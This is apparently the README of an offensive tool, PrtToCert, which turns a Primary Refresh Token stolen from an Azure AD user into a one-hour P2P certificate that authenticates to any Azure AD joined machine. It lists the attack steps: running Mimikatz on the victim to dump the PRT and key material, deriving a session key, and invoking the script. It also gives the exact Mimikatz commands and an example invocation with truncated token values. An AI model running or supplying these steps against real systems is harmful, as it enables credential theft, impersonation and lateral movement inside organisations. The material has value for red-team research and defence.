# PrtToCert
Request P2P certificate which valid for 1 hour to authenticate to any Azure AD joined machine.

## Requirements
* Python 2.7, 3.5+
* PyOpenSSL
* requests

## Usage

```
RequestCert.py [-h] --tenantId TENANTID --prt PRT --userName USERNAME --hexCtx HEXCTX --hexDerivedKey
                      HEXDERIVEDKEY [--passPhrase PASSPHRASE]
```

## Steps
* Run Mimikatz on the victim and store the PRT, tenantId, Identity and keyValue
* Run Mimikatz again with keyvalue and any context you want and create derived key
* Run the script with PRT, tenantId, Identity, context and derived key
* Generate P2P certificate from any computer as long as the PRT valid

## Example
```
Mimikatz:
  privilege::debug
  sekurlsa::cloudap
  token::elevate
  dpapi::cloudapkd
  
python RequestCert.py --tenantId 2c240ecc-...truncated --prt QVFBQkFBQUFBQUFHVl9idjIxb1FRNFJPcWgwXzEtdEFnbm9IbkFCZkgxcG1zbFFERENFY195OXFMTEF5bDhpZ3FrQ1RZa0dTdElqa3pGcXZ5...truncated --userName Gadmin@ResearchAadLabEnv.onmicrosoft.com --hexCtx e096b37dc0d8e5cde438...truncated --hexDerivedKey b8a39c7b3b7e7c859b...truncated
```
